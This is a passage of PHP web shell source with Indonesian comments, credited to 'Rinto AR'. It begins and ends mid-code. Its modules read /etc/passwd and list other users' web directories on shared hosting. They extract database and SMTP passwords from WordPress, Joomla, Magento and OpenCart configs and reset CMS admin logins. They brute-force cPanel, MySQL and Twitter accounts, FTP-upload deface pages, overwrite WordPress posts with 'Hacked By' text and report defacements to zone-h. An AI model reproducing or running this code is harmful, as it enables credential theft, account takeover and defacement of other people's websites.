							$file_config = fopen("xai_config/$user_cox-$nama_config.txt","w");
							fputs($file_config,$ambil_config);
						}
					}
				}		
			}
			echo "<center><a href='?dir=$dir/xai_config'><font color=lime>Done</font></a></center>";
			}else{
				
		echo "<form method=\"post\" action=\"\"><center>etc/passw ( Error ? <a href='?dir=$dir&do=passwbypass'>Bypass Here</a> )<br><textarea name=\"passwd\" class='area' rows='15' cols='60'>\n";
		echo file_get_contents('/etc/passwd'); 
		echo "</textarea><br><input type=\"submit\" value=\"GassPoll\"></td></tr></center>\n";
        }
} elseif($_GET['do'] == 'jumping') {
	$i = 0;
	echo "<pre><div class='margin: 5px auto;'>";
	$etc = fopen("/etc/passwd", "r");
	while($passwd = fgets($etc)) {
		if($passwd == '' || !$etc) {
			echo "<font color=red>Can't read /etc/passwd</font>";
		} else {
			preg_match_all('/(.*?):x:/', $passwd, $user_jumping);
			foreach($user_jumping[1] as $user_idx_jump) {
				$user_jumping_dir = "/home/$user_idx_jump/public_html";
				if(is_readable($user_jumping_dir)) {
					$i++;
					$jrw = "[<font color=lime>R</font>] <a href='?dir=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a><br>";
					if(is_writable($user_jumping_dir)) {
						$jrw = "[<font color=lime>RW</font>] <a href='?dir=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a><br>";
					}
					echo $jrw;
					$domain_jump = file_get_contents("/etc/named.conf");	
					if($domain_jump == '') {
						echo " => ( <font color=red>gabisa ambil nama domain nya</font> )<br>";
					} else {
						preg_match_all("#/var/named/(.*?).db#", $domain_jump, $domains_jump);
						foreach($domains_jump[1] as $dj) {
							$user_jumping_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
							$user_jumping_url = $user_jumping_url['name'];
							if($user_jumping_url == $user_idx_jump) {
								echo " => ( <u>$dj</u> )<br>";
								break;
							}
						}
					}
				}
			}
		}
	}
	if($i == 0) { 
	} else {
		echo "<br>Total ada ".$i." Kimcil di ".gethostbyname($_SERVER['HTTP_HOST'])."";
	}
	echo "</div></pre>";
} elseif($_GET['do'] == 'auto_edit_user') {
	if($_POST['hajar']) {
		if(strlen($_POST['pass_baru']) < 6 OR strlen($_POST['user_baru']) < 6) {
			echo "username atau password harus lebih dari 6 karakter";
		} else {
			$user_baru = $_POST['user_baru'];
			$pass_baru = md5($_POST['pass_baru']);
			$conf = $_POST['config_dir'];
			$scan_conf = scandir($conf);
			foreach($scan_conf as $file_conf) {
				if(!is_file("$conf/$file_conf")) continue;
				$config = file_get_contents("$conf/$file_conf");
				if(preg_match("/JConfig|joomla/",$config)) {
					$dbhost = ambilkata($config,"host = '","'");
					$dbuser = ambilkata($config,"user = '","'");
					$dbpass = ambilkata($config,"password = '","'");
					$dbname = ambilkata($config,"db = '","'");
					$dbprefix = ambilkata($config,"dbprefix = '","'");
					$prefix = $dbprefix."users";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
					$result = mysql_fetch_array($q);
					$id = $result['id'];
					$site = ambilkata($config,"sitename = '","'");
					$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE id='$id'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => Joomla<br>";
					if($site == '') {
						echo "Sitename => <font color=red>error, gabisa ambil nama domain nya</font><br>";
					} else {
						echo "Sitename => $site<br>";
					}
					if(!$update OR !$conn OR !$db) {
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					} else {
						echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
					}
					mysql_close($conn);
				} elseif(preg_match("/WordPress/",$config)) {
					$dbhost = ambilkata($config,"DB_HOST', '","'");
					$dbuser = ambilkata($config,"DB_USER', '","'");
					$dbpass = ambilkata($config,"DB_PASSWORD', '","'");
					$dbname = ambilkata($config,"DB_NAME', '","'");
					$dbprefix = ambilkata($config,"table_prefix  = '","'");
					$prefix = $dbprefix."users";
					$option = $dbprefix."options";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
					$result = mysql_fetch_array($q);
					$id = $result[ID];
					$q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
					$result2 = mysql_fetch_array($q2);
					$target = $result2[option_value];
					if($target == '') {
						$url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
					} else {
						$url_target = "Login => <a href='$target/wp-login.php' target='_blank'><u>$target/wp-login.php</u></a><br>";
					}
					$update = mysql_query("UPDATE $prefix SET user_login='$user_baru',user_pass='$pass_baru' WHERE id='$id'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => Wordpress<br>";
					echo $url_target;
					if(!$update OR !$conn OR !$db) {
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					} else {
						echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
					}
					mysql_close($conn);
				} elseif(preg_match("/Magento|Mage_Core/",$config)) {
					$dbhost = ambilkata($config,"<host><![CDATA[","]]></host>");
					$dbuser = ambilkata($config,"<username><![CDATA[","]]></username>");
					$dbpass = ambilkata($config,"<password><![CDATA[","]]></password>");
					$dbname = ambilkata($config,"<dbname><![CDATA[","]]></dbname>");
					$dbprefix = ambilkata($config,"<table_prefix><![CDATA[","]]></table_prefix>");
					$prefix = $dbprefix."admin_user";
					$option = $dbprefix."core_config_data";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");
					$result = mysql_fetch_array($q);
					$id = $result[user_id];
					$q2 = mysql_query("SELECT * FROM $option WHERE path='web/secure/base_url'");
					$result2 = mysql_fetch_array($q2);
					$target = $result2[value];
					if($target == '') {
						$url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
					} else {
						$url_target = "Login => <a href='$target/admin/' target='_blank'><u>$target/admin/</u></a><br>";
					}
					$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => Magento<br>";
					echo $url_target;
					if(!$update OR !$conn OR !$db) {
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					} else {
						echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
					}
					mysql_close($conn);
				} elseif(preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/",$config)) {
					$dbhost = ambilkata($config,"'DB_HOSTNAME', '","'");
					$dbuser = ambilkata($config,"'DB_USERNAME', '","'");
					$dbpass = ambilkata($config,"'DB_PASSWORD', '","'");
					$dbname = ambilkata($config,"'DB_DATABASE', '","'");
					$dbprefix = ambilkata($config,"'DB_PREFIX', '","'");
					$prefix = $dbprefix."user";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");
					$result = mysql_fetch_array($q);
					$id = $result[user_id];
					$target = ambilkata($config,"HTTP_SERVER', '","'");
					if($target == '') {
						$url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
					} else {
						$url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a><br>";
					}
					$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => OpenCart<br>";
					echo $url_target;
					if(!$update OR !$conn OR !$db) {
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					} else {
						echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
					}
					mysql_close($conn);
				} elseif(preg_match("/panggil fungsi validasi xss dan injection/",$config)) {
					$dbhost = ambilkata($config,'server = "','"');
					$dbuser = ambilkata($config,'username = "','"');
					$dbpass = ambilkata($config,'password = "','"');
					$dbname = ambilkata($config,'database = "','"');
					$prefix = "users";
					$option = "identitas";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $option ORDER BY id_identitas ASC");
					$result = mysql_fetch_array($q);
					$target = $result[alamat_website];
					if($target == '') {
						$target2 = $result[url];
						$url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
						if($target2 == '') {
							$url_target2 = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
						} else {
							$cek_login3 = file_get_contents("$target2/adminweb/");
							$cek_login4 = file_get_contents("$target2/lokomedia/adminweb/");
							if(preg_match("/CMS Lokomedia|Administrator/", $cek_login3)) {
								$url_target2 = "Login => <a href='$target2/adminweb' target='_blank'><u>$target2/adminweb</u></a><br>";
							} elseif(preg_match("/CMS Lokomedia|Lokomedia/", $cek_login4)) {
								$url_target2 = "Login => <a href='$target2/lokomedia/adminweb' target='_blank'><u>$target2/lokomedia/adminweb</u></a><br>";
							} else {
								$url_target2 = "Login => <a href='$target2' target='_blank'><u>$target2</u></a> [ <font color=red>gatau admin login nya dimana :p</font> ]<br>";
							}
						}
					} else {
						$cek_login = file_get_contents("$target/adminweb/");
						$cek_login2 = file_get_contents("$target/lokomedia/adminweb/");
						if(preg_match("/CMS Lokomedia|Administrator/", $cek_login)) {
							$url_target = "Login => <a href='$target/adminweb' target='_blank'><u>$target/adminweb</u></a><br>";
						} elseif(preg_match("/CMS Lokomedia|Lokomedia/", $cek_login2)) {
							$url_target = "Login => <a href='$target/lokomedia/adminweb' target='_blank'><u>$target/lokomedia/adminweb</u></a><br>";
						} else {
							$url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a> [ <font color=red>gatau admin login nya dimana :p</font> ]<br>";
						}
					}
					$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE level='admin'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => Lokomedia<br>";
					if(preg_match('/error, gabisa ambil nama domain nya/', $url_target)) {
						echo $url_target2;
					} else {
						echo $url_target;
					}
					if(!$update OR !$conn OR !$db) {
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					} else {
						echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
					}
					mysql_close($conn);
				}
			}
		}
	} else {
		echo "<center>
		<h1>Auto Edit User Config</h1>
		<form method='post'>
		DIR Config: <br>
		<input type='text' size='50' name='config_dir' value='$dir'><br><br>
		Set User & Pass: <br>
		<input type='text' name='user_baru' value='rintoar' placeholder='user_baru'><br>
		<input type='text' name='pass_baru' value='rintoar' placeholder='pass_baru'><br>
		<input type='submit' name='hajar' value='Hajar!' style='width: 215px;'>
		</form>
		<span>NB: Tools ini work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span><br>
		";
	}
} elseif($_GET['do'] == 'cpanel') {
	if($_POST['crack']) {
		$usercp = explode("\r\n", $_POST['user_cp']);
		$passcp = explode("\r\n", $_POST['pass_cp']);
		$i = 0;
		foreach($usercp as $ucp) {
			foreach($passcp as $pcp) {
				if(@mysql_connect('localhost', $ucp, $pcp)) {
					if($_SESSION[$ucp] && $_SESSION[$pcp]) {
					} else {
						$_SESSION[$ucp] = "1";
						$_SESSION[$pcp] = "1";
						$i++;
						echo "username (<font color=lime>$ucp</font>) password (<font color=lime>$pcp</font>)<br>";
					}
				}
			}
		}
		if($i == 0) {
		} else {
			echo "<br>sukses nyolong ".$i." Cpanel by <font color=lime>BcctNgntd Shell.</font>";
		}
	} else {
		echo "<center>
		<form method='post'>
		USER: <br>
		<textarea style='width: 450px; height: 150px;' name='user_cp'>";
		$_usercp = fopen("/etc/passwd","r");
		while($getu = fgets($_usercp)) {
			if($getu == '' || !$_usercp) {
				echo "<font color=red>Can't read /etc/passwd</font>";
			} else {
				preg_match_all("/(.*?):x:/", $getu, $u);
				foreach($u[1] as $user_cp) {
						if(is_dir("/home/$user_cp/public_html")) {
							echo "$user_cp\n";
					}
				}
			}
		}
		echo "</textarea><br>
		PASS: <br>
		<textarea style='width: 450px; height: 200px;' name='pass_cp'>";
		function cp_pass($dir) {
			$pass = "";
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				if(!is_file("$dir/$dirb")) continue;
				$ambil = file_get_contents("$dir/$dirb");
				if(preg_match("/WordPress/", $ambil)) {
					$pass .= ambilkata($ambil,"DB_PASSWORD', '","'")."\n";
				} elseif(preg_match("/JConfig|joomla/", $ambil)) {
					$pass .= ambilkata($ambil,"password = '","'")."\n";
				} elseif(preg_match("/Magento|Mage_Core/", $ambil)) {
					$pass .= ambilkata($ambil,"<password><![CDATA[","]]></password>")."\n";
				} elseif(preg_match("/panggil fungsi validasi xss dan injection/", $ambil)) {
					$pass .= ambilkata($ambil,'password = "','"')."\n";
				} elseif(preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/", $ambil)) {
					$pass .= ambilkata($ambil,"'DB_PASSWORD', '","'")."\n";
				} elseif(preg_match("/client/", $ambil)) {
					preg_match("/password=(.*)/", $ambil, $pass1);
					if(preg_match('/"/', $pass1[1])) {
						$pass1[1] = str_replace('"', "", $pass1[1]);
						$pass .= $pass1[1]."\n";
					}
				} elseif(preg_match("/cc_encryption_hash/", $ambil)) {
					$pass .= ambilkata($ambil,"db_password = '","'")."\n";
				}
			}
			echo $pass;
		}
		$cp_pass = cp_pass($dir);
		echo $cp_pass;
		echo "</textarea><br>
		<input type='submit' name='crack' style='width: 450px;' value='Crack'>
		</form>
		<span>NB: CPanel Crack ini sudah auto get password ( pake db password ) maka akan work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span><br></center>";
	}
} elseif($_GET['do'] == 'cpftp_auto') {
    if($_POST['crack']) {
        $usercp = explode("\r\n", $_POST['user_cp']);
        $passcp = explode("\r\n", $_POST['pass_cp']);
        $i = 0;
        foreach($usercp as $ucp) {
            foreach($passcp as $pcp) {
                if(@mysql_connect('localhost', $ucp, $pcp)) {
                    if($_SESSION[$ucp] && $_SESSION[$pcp]) {
                    } else {
                        $_SESSION[$ucp] = "1";
                        $_SESSION[$pcp] = "1";
                        if($ucp == '' || $pcp == '') {
                            //
                        } else {
                            echo "[+] username (<font color=lime>$ucp</font>) password (<font color=lime>$pcp</font>)<br>";
                            $ftp_conn = ftp_connect(gethostbyname($_SERVER['HTTP_HOST']));
                            $ftp_login = ftp_login($ftp_conn, $ucp, $pcp);
                            if((!$ftp_login) || (!$ftp_conn)) {
                                echo "[+] <font color=red>Login Gagal</font><br><br>";
                            } else {
                                echo "[+] <font color=lime>Login Sukses</font><br>";
                                $fi = htmlspecialchars($_POST['file_deface']);
                                $deface = ftp_put($ftp_conn, "public_html/$fi", $_POST['deface'], FTP_BINARY);
                                if($deface) {
                                    $i++;
                                    echo "[+] <font color=lime>Deface Sukses</font><br>";
                                    if(function_exists('posix_getpwuid')) {
                                        $domain_cp = file_get_contents("/etc/named.conf"); 
                                        if($domain_cp == '') {
                                            echo "[+] <font color=red>gabisa ambil nama domain nya</font><br><br>";
                                        } else {
                                            preg_match_all("#/var/named/(.*?).db#", $domain_cp, $domains_cp);
                                            foreach($domains_cp[1] as $dj) {
                                                $user_cp_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
                                                $user_cp_url = $user_cp_url['name'];
                                                if($user_cp_url == $ucp) {
                                                    echo "[+] <a href='http://$dj/$fi' target='_blank'>http://$dj/$fi</a><br><br>";
                                                    break;
                                                }
                                            }
                                        }
                                    } else {
                                        echo "[+] <font color=red>gabisa ambil nama domain nya</font><br><br>";
                                    }
                                } else {
                                    echo "[-] <font color=red>Deface Gagal</font><br><br>";
                                }
                            }
                            //echo "username (<font color=lime>$ucp</font>) password (<font color=lime>$pcp</font>)<br>";
                        }
                    }
                }
            }
        }
        if($i == 0) {
        } else {
            echo "<br>sukses deface ".$i." Cpanel by <font color=lime>XaiShell.</font>";
        }
    } else {
        echo "<center>
        <form method='post'>
        Filename: <br>
        <input type='text' name='file_deface' placeholder='index.php' value='index.php' style='width: 450px;'><br>
        Deface Page: <br>
        <input type='text' name='deface' placeholder='http://www.web-yang-udah-di-deface.com/filemu.php' style='width: 450px;'><br>
        USER: <br>
        <textarea style='width: 450px; height: 150px;' name='user_cp'>";
        $_usercp = fopen("/etc/passwd","r");
        while($getu = fgets($_usercp)) {
            if($getu == '' || !$_usercp) {
                echo "<font color=red>Can't read /etc/passwd</font>";
            } else {
                preg_match_all("/(.*?):x:/", $getu, $u);
                foreach($u[1] as $user_cp) {
                        if(is_dir("/home/$user_cp/public_html")) {
                            echo "$user_cp\n";
                    }
                }
            }
        }
        echo "</textarea><br>
        PASS: <br>
        <textarea style='width: 450px; height: 200px;' name='pass_cp'>";
        function cp_pass($dir) {
            $pass = "";
            $dira = scandir($dir);
            foreach($dira as $dirb) {
                if(!is_file("$dir/$dirb")) continue;
                $ambil = file_get_contents("$dir/$dirb");
                if(preg_match("/WordPress/", $ambil)) {
                    $pass .= ambilkata($ambil,"DB_PASSWORD', '","'")."\n";
                } elseif(preg_match("/JConfig|joomla/", $ambil)) {
                    $pass .= ambilkata($ambil,"password = '","'")."\n";
                } elseif(preg_match("/Magento|Mage_Core/", $ambil)) {
                    $pass .= ambilkata($ambil,"<password><![CDATA[","]]></password>")."\n";
                } elseif(preg_match("/panggil fungsi validasi xss dan injection/", $ambil)) {
                    $pass .= ambilkata($ambil,'password = "','"')."\n";
                } elseif(preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/", $ambil)) {
                    $pass .= ambilkata($ambil,"'DB_PASSWORD', '","'")."\n";
                } elseif(preg_match("/client/", $ambil)) {
                    preg_match("/password=(.*)/", $ambil, $pass1);
                    $pass .= $pass1[1]."\n";
                    if(preg_match('/"/', $pass1[1])) {
                        $pass1[1] = str_replace('"', "", $pass1[1]);
                        $pass .= $pass1[1]."\n";
                    }
                } elseif(preg_match("/cc_encryption_hash/", $ambil)) {
                    $pass .= ambilkata($ambil,"db_password = '","'")."\n";
                }
            }
            echo $pass;
        }
        $cp_pass = cp_pass($dir);
        echo $cp_pass;
        echo "</textarea><br>
        <input type='submit' name='crack' style='width: 450px;' value='Hajar'>
        </form>
        <span>NB: CPanel Crack ini sudah auto get password ( pake db password ) maka akan work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span><br></center>";
    }
} elseif($_GET['do'] == 'twitterbf') {
echo "<br><center><span style='font-size:30px; color:#009900'>Twitter Multi-Account BruteForce</span></center><br>
<p dir='ltr' align='center'>
<textarea cols='42' class='area' rows='14' name='username' style='width:300px;height:130px;'>Username</textarea> 
<textarea cols='42' class='area' rows='14' name='password' style='width:300px;height:130px;'>Password</textarea><br><br><input type='submit' value='Attack Now'><br></p><br>";
if($_POST['username'] and $_POST['password']){
        #function
        function brute($user,$pass)
        {
                $ch = curl_init();      
                curl_setopt($ch, CURLOPT_URL, "https://twitter.com/intent/session/");
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                curl_setopt($ch, CURLOPT_POSTFIELDS, "authenticity_token=&session[username_or_email]={$user}&session[password]={$pass}&remember_me=1");
                curl_setopt($ch, CURLOPT_USERAGENT, "Chrome/34.0.1847.116"); #change with your real useragent plz
                
                # cURL - Brute Users & Password
                $login = curl_exec($ch);
                if(eregi("error notice", $login)){
                 
                
                        echo "<p align='center' dir='ltr'><font face='Tahoma' size='2'>[+] : Username : <font color='red'>$user</font>&nbsp; Incorrect Password =====>: <font color='red'>$pass</font></font></p>"; 
                }else{
                echo "<p align='center' dir='ltr'><font face='Tahoma' size='2'>[+] : [+] CRACKED SUCCESSFULLY [+]Username : <font color='green'>$user</font>&nbsp; GOOD PASSWORD =====>: <font color='green'>$pass</font></font></p>";
                }
        }
        # POSTS
        $username = explode("n", $_POST['username']);
        $password = explode("n", $_POST['password']);
        
        # Foreach Users N' Textarea
        foreach($username as $users) {
                $users = @trim($users);
        foreach($password as $pass) {
                $pass = @trim($pass);
                brute($users,$pass); }}
        # cURL
        
        }
        echo "<p align='center' dir='ltr'><font size='2'>Coded By : Mauritania Attacker, &amp; Recoded by Rinto AR</font></p>";

} elseif($_GET['do'] == 'smtp') {
	echo "<center><span>NB: Tools ini work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span></center><br>";
	function scj($dir) {
		$dira = scandir($dir);
		foreach($dira as $dirb) {
			if(!is_file("$dir/$dirb")) continue;
			$ambil = file_get_contents("$dir/$dirb");
			$ambil = str_replace("$", "", $ambil);
			if(preg_match("/JConfig|joomla/", $ambil)) {
				$smtp_host = ambilkata($ambil,"smtphost = '","'");
				$smtp_auth = ambilkata($ambil,"smtpauth = '","'");
				$smtp_user = ambilkata($ambil,"smtpuser = '","'");
				$smtp_pass = ambilkata($ambil,"smtppass = '","'");
				$smtp_port = ambilkata($ambil,"smtpport = '","'");
				$smtp_secure = ambilkata($ambil,"smtpsecure = '","'");
				echo "SMTP Host: <font color=lime>$smtp_host</font><br>";
				echo "SMTP port: <font color=lime>$smtp_port</font><br>";
				echo "SMTP user: <font color=lime>$smtp_user</font><br>";
				echo "SMTP pass: <font color=lime>$smtp_pass</font><br>";
				echo "SMTP auth: <font color=lime>$smtp_auth</font><br>";
				echo "SMTP secure: <font color=lime>$smtp_secure</font><br><br>";
			}
		}
	}
	$smpt_hunter = scj($dir);
	echo $smpt_hunter;
} elseif($_GET['do'] == 'csrfup')
{	
echo '<html>
<center><h1 style="font-size:33px;">CSRF Exploiter By IndoXPloit<br>Recoded by Rinto AR</h1><br><br>
<font size="3">*Note : Post File, Type : Filedata / dzupload / dzfile / dzfiles / file / ajaxfup / files[] / qqfile / userfile / etc</font>
<br><br>
<form method="post" style="font-size:25px;">
URL: <input type="text" name="url" size="50" height="10" placeholder="http://www.target.com/path/upload.php" style="margin: 5px auto; padding-left: 5px;" required><br>
POST File: <input type="text" name="pf" size="50" height="10" placeholder="Lihat diatas ^" style="margin: 5px auto; padding-left: 5px;" required><br>
<input type="submit" name="d" value="Lock!">
</form>';
$url = $_POST["url"];
$pf = $_POST["pf"];
$d = $_POST["d"];
if($d) {
	echo "<form method='post' target='_blank' action='$url' enctype='multipart/form-data'><input type='file' name='$pf'><input type='submit' name='g' value='Upload'></form></form>
</html>";
}

} elseif($_GET['do'] == 'auto_wp') {
	if($_POST['hajar']) {
		$title = htmlspecialchars($_POST['new_title']);
		$pn_title = str_replace(" ", "-", $title);
		if($_POST['cek_edit'] == "Y") {
			$script = $_POST['edit_content'];
		} else {
			$script = $title;
		}
		$conf = $_POST['config_dir'];
		$scan_conf = scandir($conf);
		foreach($scan_conf as $file_conf) {
			if(!is_file("$conf/$file_conf")) continue;
			$config = file_get_contents("$conf/$file_conf");
			if(preg_match("/WordPress/", $config)) {
				$dbhost = ambilkata($config,"DB_HOST', '","'");
				$dbuser = ambilkata($config,"DB_USER', '","'");
				$dbpass = ambilkata($config,"DB_PASSWORD', '","'");
				$dbname = ambilkata($config,"DB_NAME', '","'");
				$dbprefix = ambilkata($config,"table_prefix  = '","'");
				$prefix = $dbprefix."posts";
				$option = $dbprefix."options";
				$conn = mysql_connect($dbhost,$dbuser,$dbpass);
				$db = mysql_select_db($dbname);
				$q = mysql_query("SELECT * FROM $prefix ORDER BY ID ASC");
				$result = mysql_fetch_array($q);
				$id = $result[ID];
				$q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
				$result2 = mysql_fetch_array($q2);
				$target = $result2[option_value];
				$update = mysql_query("UPDATE $prefix SET post_title='$title',post_content='$script',post_name='$pn_title',post_status='publish',comment_status='open',ping_status='open',post_type='post',comment_count='1' WHERE id='$id'");
				$update .= mysql_query("UPDATE $option SET option_value='$title' WHERE option_name='blogname' OR option_name='blogdescription'");
				echo "<div style='margin: 5px auto;'>";
				if($target == '') {
					echo "URL: <font color=red>error, gabisa ambil nama domain nya</font> -> ";
				} else {
					echo "URL: <a href='$target/?p=$id' target='_blank'>$target/?p=$id</a> -> ";
				}
				if(!$update OR !$conn OR !$db) {
					echo "<font color=red>MySQL Error: ".mysql_error()."</font><br>";
				} else {
					echo "<font color=lime>sukses di ganti.</font><br>";
				}
				echo "</div>";
				mysql_close($conn);
			}
		}
	} else {
		echo "<center>
		<h1>Auto Edit Title+Content WordPress</h1>
		<form method='post'>
		DIR Config: <br>
		<input type='text' size='50' name='config_dir' value='$dir'><br><br>
		Set Title: <br>
		<input type='text' name='new_title' value='Hacked By Rinto AR' placeholder='New Title'><br><br>
		Edit Content?: <input type='radio' name='cek_edit' value='Y' checked>Y<input type='radio' name='cek_edit' value='N'>N<br>
		<span>Jika pilih <u>Y</u> masukin script defacemu ( saran yang simple aja ), kalo pilih <u>N</u> gausah di isi.</span><br>
		<textarea name='edit_content' placeholder='contoh script: http://pastebin.com/EpP671gK' style='width: 450px; height: 150px;'></textarea><br>
		<input type='submit' name='hajar' value='Hajar!' style='width: 450px;'><br>
		</form>
		<span>NB: Tools ini work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span><br>
		";
	}
} elseif($_GET['do'] == 'zoneh') {
	if($_POST['submit']) {
		$domain = explode("\r\n", $_POST['url']);
		$nick =  $_POST['nick'];
		echo "Defacer Onhold: <a href='http://www.zone-h.org/archive/notifier=$nick/published=0' target='_blank'>http://www.zone-h.org/archive/notifier=$nick/published=0</a><br>";
		echo "Defacer Archive: <a href='http://www.zone-h.org/archive/notifier=$nick' target='_blank'>http://www.zone-h.org/archive/notifier=$nick</a><br><br>";
		function zoneh($url,$nick) {
			$ch = curl_init("http://www.zone-h.com/notify/single");
				  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
				  curl_setopt($ch, CURLOPT_POST, true);
				  curl_setopt($ch, CURLOPT_POSTFIELDS, "defacer=$nick&domain1=$url&hackmode=1&reason=1&submit=Send");
			return curl_exec($ch);
				  curl_close($ch);
		}
		foreach($domain as $url) {
			$zoneh = zoneh($url,$nick);
			if(preg_match("/color=\"red\">OK<\/font><\/li>/i", $zoneh)) {
				echo "$url -> <font color=lime>OK</font><br>";
			} else {
				echo "$url -> <font color=red>ERROR</font><br>";
			}
		}
	} else {
		echo "<center><form method='post'>
		<u>Defacer</u>: <br>
		<input type='text' name='nick' size='50' value='Rinto AR'><br>
		<u>Domains</u>: <br>
		<textarea style='width: 450px; height: 150px;' name='url'></textarea><br>
		<input type='submit' name='submit' value='Submit' style='width: 450px;'>
		</form>";
	}
	echo "</center>";
} elseif($_GET['do'] == 'cmstector')
    {
    ?>
    <form action="?y=<?php echo $pwd; ?>&x=cms_detect" method="post">
	<br><br><br><br><center><b><font size=4>+--=[ CMS Detector ]=--+</font></b></center><br><br>
    <?php
if(!file_exists('pee.tmp')){
@fopen('pee.tmp', 'w');

echo'<table align="center" border="1" width="45%" cellspacing="0" cellpadding="4" class="td1">';
echo'<tr><td><center><b>SITE</b></center></td><td><center><b>USER</b></center></td><td><center><b>CMS</b></center></td></table>';

$p = 0;

if(is_readable("/var/named")){
$list = scandir("/var/named");
$current_dir = posix_getcwd();
$dir = explode("/",$current_dir);
foreach($list as $domain){
if(strpos($domain,".db"))
{
	$domain = str_replace('.db','',$domain);
	$owner = posix_getpwuid(fileowner("/etc/valiases/".$domain));
	
error_reporting(0);

$link = $pageURL.'pee/'.$owner['name'];

cms_add($link,$domain,$owner['name'],"WordPress");
cms_add($link,$domain,$owner['name'],"Joomla");
cms_add($link,$domain,$owner['name'],"vBulletin");
cms_add($link,$domain,$owner['name'],"WHMCS");
cms_add($link,$domain,$owner['name'],"PhpBB");
cms_add($link,$domain,$owner['name'],"MyBB");
cms_add($link,$domain,$owner['name'],"IPB");
cms_add($link,$domain,$owner['name'],"SMF");
cms_add($link,$domain,$owner['name'],"Drupal");
cms_add($link,$domain,$owner['name'],"e107");
cms_add($link,$domain,$owner['name'],"Seditio");
cms_add($link,$domain,$owner['name'],"osCommerce");

}
}
}
}else{
echo'<table align="center" border="1" width="45%" cellspacing="0" cellpadding="4" class="td1">';
echo'<tr><td><center><b>SITE</b></center></td><td><center><b>USER</b></center></td><td><center><b>CMS</b></center></td></table><br><br>';
$content = file_get_contents($pageURL.'pee.tmp');
echo $content;
	}
} elseif($_GET['do'] == 'whois')
{	
@set_time_limit(0);
   @error_reporting(0);
   function sws_domain_info($site)
   {
   $getip = @file_get_contents("http://networktools.nl/whois/$site");
   flush();
   $ip = @findit($getip,'<pre>','</pre>');
   return $ip;
   flush();
   }
   function sws_net_info($site)
   {
   $getip = @file_get_contents("http://networktools.nl/asinfo/$site");
   $ip = @findit($getip,'<pre>','</pre>');
   return $ip;
   flush();
   }
   function sws_site_ser($site)
   {
   $getip = @file_get_contents("http://networktools.nl/reverseip/$site");
   $ip = @findit($getip,'<pre>','</pre>');
   return $ip;
   flush();
   }
   function sws_sup_dom($site)
   {
   $getip = @file_get_contents("http://www.magic-net.info/dns-and-ip-tools.dnslookup?subd=".$site."&Search+subdomains=Find+subdomains");
   $ip = @findit($getip,'<strong>Nameservers found:</strong>','<script type="text/javascript">');
   return $ip;
   flush();
   }
   function sws_port_scan($ip)
   {
   $list_post = array('80','21','22','2082','25','53','110','443','143');
   foreach ($list_post as $o_port)
   {
   $connect = @fsockopen($ip,$o_port,$errno,$errstr,5);
   if($connect)
   {
